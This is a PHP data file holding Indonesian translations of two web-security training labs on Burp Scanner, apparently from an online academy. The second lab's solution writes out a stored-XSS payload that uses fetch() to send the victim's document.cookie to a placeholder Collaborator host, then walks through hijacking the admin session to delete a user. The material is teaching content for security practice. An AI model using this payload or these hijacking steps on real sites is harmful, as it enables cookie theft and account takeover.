<?php

return [
    '096e751392d26a789766b80531b5930fe3295d0856c2e072ab0818276834af9e' => [
        'title' => 'Menemukan kerentanan secara cepat dengan pemindaian terarah (targeted scanning)',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki kerentanan yang memungkinkan Anda membaca file sembarangan dari server. Untuk menyelesaikan lab ini, ambil isi file <code>/etc/passwd</code> dalam waktu 10 menit.
        </p><p>
            Mengingat batas waktu yang sempit, kami menyarankan penggunaan Burp Scanner untuk membantu Anda. Anda bisa saja memindai seluruh situs, tetapi cara itu mungkin tidak menyisakan cukup waktu. Sebaiknya manfaatkan intuisi Anda untuk mengenali endpoint yang berpotensi rentan, lalu jalankan <a href="/web-security/essential-skills/using-burp-scanner-during-manual-testing#scanning-a-specific-request">targeted scan pada permintaan tertentu</a>. Begitu Burp Scanner menemukan vektor serangan, gunakan keahlian Anda sendiri untuk mengeksploitasinya.
        </p><div class="component-solution expandable-container">
            
            
        <details><summary><h4><span class="icon-erlenmeyer"></span> Petunjuk</h4></summary><div class="content"><div>
                <p>
                    Jika mengalami kebuntuan, pelajari topik Academy kami mengenai kelas kerentanan yang teridentifikasi tersebut.
                </p>
            </div></div></details></div>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <p>
                    Jika mengalami kebuntuan, pelajari topik Academy kami mengenai kelas kerentanan yang teridentifikasi tersebut.
                </p>
            </div></div>
LABHTML,
            1 => <<<'LABHTML'
<div class="content"><div>
                <p>
                    Lab ini dirancang untuk membantu Anda mempelajari cara pemindaian terarah (targeted scan) mempercepat proses pengintaian awal. Oleh karena itu, kami tidak menyediakan solusi langkah demi langkah.
                </p>
            </div></div>
LABHTML,
        ],
    ],
    'aa337200ef03f4adb1c669e54c672a13150d20a25cee6622930f71c424f0affc' => [
        'title' => 'Memindai struktur data non-standar',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki kerentanan yang sulit ditemukan secara manual karena berada dalam struktur data non-standar.
        </p><p>
            Untuk menyelesaikan lab ini, gunakan fitur <strong>Scan selected insertion point</strong> pada Burp Scanner untuk mengidentifikasi kerentanan, lalu eksploitasi secara manual dan hapus pengguna <code>carlos</code>.
        </p><p>
            Anda dapat masuk ke akun Anda menggunakan kredensial berikut: <code>wiener:peter</code>
        </p>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <p>
                    <strong>Identifikasi kerentanan</strong>
                </p>
            <ol>
                <li>
                    Masuk ke akun Anda menggunakan kredensial yang diberikan.
                </li>
                <li>
                    Di Burp, buka tab <strong>Proxy &gt; HTTP history</strong>.
                </li>
                <li>
                    Temukan permintaan <code>GET /my-account?id=wiener</code> yang berisi cookie sesi terautentikasi Anda.
                </li>
                <li>
                    Amati cookie sesi tersebut dan perhatikan bahwa cookie menyimpan username Anda dalam teks terang (cleartext) diikuti token tertentu yang dipisahkan tanda titik dua. Ini menandakan aplikasi mungkin memperlakukan nilai cookie sebagai dua input terpisah.
                </li>
                <li>
                    Sorot bagian pertama cookie sesi, yaitu teks terang <code>wiener</code>.
                </li>
                <li>
                    Klik kanan lalu pilih <strong>Scan selected insertion point</strong>, kemudian klik <strong>OK</strong>.
                </li>
                <li>
                    Buka tab <strong>Dashboard</strong> dan tunggu pemindaian selesai.
                </li>
            </ol>
            <p>
                Sekitar satu menit setelah pemindaian dimulai, perhatikan bahwa Burp Scanner melaporkan temuan <strong>Cross-site scripting (stored)</strong> yang dideteksi lewat interaksi ke server Burp Collaborator.
            </p>
            <div class="highlightedarea">
                <h4>Catatan</h4>
                <p>
                    Keterlambatan pelaporan temuan disebabkan oleh interval polling. Secara default, Burp memeriksa interaksi baru di server Burp Collaborator setiap satu menit.
                </p>
            </div>
            <p>
                <strong>Curi cookie pengguna admin</strong>
            </p>
            <ol>
                <li>
                    Di <strong>Dashboard</strong>, pilih temuan masalah tersebut.
                </li>
                <li>
                    Pada panel bawah, buka tab <strong>Request</strong> yang menampilkan permintaan yang dipakai Burp Scanner untuk menemukan kerentanan.
                </li>
                <li>
                    Kirim permintaan tersebut ke Burp Repeater.
                </li>
                <li>
                    Buka tab <strong>Collaborator</strong> dan klik <strong>Copy to clipboard</strong> untuk menyalin payload Burp Collaborator baru.
                </li>
                <li>
                    Kembali ke tab <strong>Repeater</strong> dan gunakan Inspector untuk melihat cookie dalam bentuk terdekode.
                </li>
                <li>
                    <p>
                        Menggunakan payload Collaborator yang baru disalin, ganti proof-of-concept milik Burp Scanner dengan eksploit untuk mengeksfiltrasi cookie korban, misalnya:
                        <code class="code-scrollable">'"&gt;&lt;svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)&gt;:YOUR-SESSION-ID</code>
                    </p>
                    <p>
                        Pastikan Anda mempertahankan bagian kedua cookie yang berisi ID sesi Anda.
                    </p>
                </li>
                <li>
                    Klik <strong>Apply changes</strong>, lalu klik <strong>Send</strong>.
                </li>
                <li>
                    Kembali ke tab <strong>Collaborator</strong>. Setelah sekitar satu menit, klik <strong>Poll now</strong> dan amati bahwa server Collaborator menerima interaksi DNS dan HTTP baru.
                </li>
                <li>
                    Pilih salah satu interaksi HTTP tersebut.
                </li>
                <li>
                    Pada tab <strong>Request to Collaborator</strong>, amati bahwa path permintaan memuat cookie pengguna admin.
                </li>
            </ol>
            <p>
                <strong>Gunakan cookie pengguna admin untuk mengakses panel admin</strong>
            </p>
            <ol>
                <li>
                    Salin cookie sesi pengguna admin.
                </li>
                <li>
                    Buka browser Burp dan buka menu <strong>DevTools</strong>.
                </li>
                <li>
                    Buka tab <strong>Application</strong> lalu pilih <strong>Cookies</strong>.
                </li>
                <li>
                    Ganti cookie sesi Anda dengan cookie sesi milik pengguna admin, lalu muat ulang halaman.
                </li>
                <li>
                    Buka panel admin dan hapus pengguna <code>carlos</code> untuk menyelesaikan lab.
                </li>
            </ol>
            </div></div>
LABHTML,
        ],
    ],
];
